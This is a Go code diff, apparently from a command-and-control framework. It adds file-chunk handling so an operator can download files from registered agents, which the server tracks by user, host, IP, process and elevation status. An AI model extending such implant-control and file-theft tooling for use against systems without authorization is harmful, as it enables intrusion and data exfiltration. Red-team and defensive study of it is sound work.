@@ -9,12 +9,14 @@ import (
 	"github.com/z3vxo/kronos/internal/broker"
 	"github.com/z3vxo/kronos/internal/bytemgr"
 	"github.com/z3vxo/kronos/internal/database"
+	"github.com/z3vxo/kronos/internal/files"
 )
 
 type AgentHandler struct {
-	DB     *database.DB
-	Broker *broker.Broker
-	Host   string
+	DB      *database.DB
+	Broker  *broker.Broker
+	FileMgr *files.Manager
+	Host    string
 }
 
 func ConvertToWindowsVer(major, minor, build uint32) string {
@@ -52,7 +54,7 @@ type UserDetails struct {
 
 type DataDetails struct {
 	AgentID string `json:"agent_id"`
-	TaskID  uint32  `json:"task_id"`
+	TaskID  uint32 `json:"task_id"`
 	Output  string `json:"output"`
 }
 
@@ -74,7 +76,7 @@ func (h *AgentHandler) HandleClientRegister(ip string, r *bytes.Reader) error {
 	err = h.DB.InsertAgent(Client.Guid, CodeName,
 		Client.User, Client.Host,
 		Client.InternaIP, Client.ExternalIP,
-		Client.ProcPath, ver, Client.Pid, Client.Ppid,Client.Tid, Client.IsElev, Client.Arch)
+		Client.ProcPath, ver, Client.Pid, Client.Ppid, Client.Tid, Client.IsElev, Client.Arch)
 	if err != nil {
 		return err
 	}
@@ -103,23 +105,53 @@ func (h *AgentHandler) HandleAgentOutput(r *bytes.Reader, id string) {
 		fmt.Println(err)
 		return
 	}
-	
+
 	for _, o := range OutputEntrys {
+		if o.FileOutput != nil {
+			result, err := h.FileMgr.ProcessFileChunk(id, o.TaskID, files.Chunk{
+				Status: uint32(o.FileOutput.Status),
+				Data:   o.FileOutput.Data,
+			})
+			if err != nil {
+				fmt.Println(err)
+				continue
+			}
+			if result.Done {
+				data, err := json.Marshal(Event{
+					CmdType: 2,
+					Data: DataDetails{
+						AgentID: id,
+						TaskID:  o.TaskID,
+						Output:  fmt.Sprintf("Download complete: %s (%d bytes)", result.FinalPath, result.BytesSeen),
+					},
+				})
+				if err != nil {
+					fmt.Println(err)
+					return
+				}
+				h.Broker.Broadcast(string(data))
+				err = h.DB.DeleteTask(id, strconv.FormatUint(uint64(o.TaskID), 10))
+				if err != nil {
+					fmt.Println(err)
+				}
+			}
+			continue
+		}
 
 		data, err := json.Marshal(Event{
-		CmdType: 2,
-		Data: DataDetails{
+			CmdType: 2,
+			Data: DataDetails{
 				AgentID: id,
-		 		TaskID:  o.TaskID,
-		 		Output:  string(o.Output),
-		 	},
+				TaskID:  o.TaskID,
+				Output:  string(o.Output),
+			},
 		})
 		if err != nil {
-		 	fmt.Println(err)
-		 	return
+			fmt.Println(err)
+			return
 		}
 		h.Broker.Broadcast(string(data))
-		err = h.DB.DeleteTask(id, strconv.FormatUint(uint64(o.TaskID), 10)) 
+		err = h.DB.DeleteTask(id, strconv.FormatUint(uint64(o.TaskID), 10))
 		if err != nil {
 			fmt.Println(err)
 		}
